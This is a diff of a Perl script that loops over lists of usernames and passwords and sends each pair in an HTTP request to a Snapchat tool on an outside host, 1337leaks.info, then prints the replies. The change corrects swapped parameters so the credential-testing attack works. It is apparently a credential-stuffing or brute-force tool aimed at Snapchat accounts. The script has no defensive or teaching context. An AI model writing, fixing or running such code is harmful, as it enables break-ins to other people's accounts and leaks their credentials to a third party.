@@ -94,7 +94,7 @@ chomp $username2;
 foreach $password2 (@USER2) {
 chomp $password2;
 	$ua2 = LWP::UserAgent->new();
-	$request2 = HTTP::Request->new(GET => "http://1337leaks.info/tools/snapchat/unproxy.php?username=$password2&password=$username2");
+	$request2 = HTTP::Request->new(GET => "http://1337leaks.info/tools/snapchat/unproxy.php?username=$username2&password=$password2");
 	$response2 = $ua2->request($request2);
 	$output2 = $response2->content();
 	print "$output2\n";
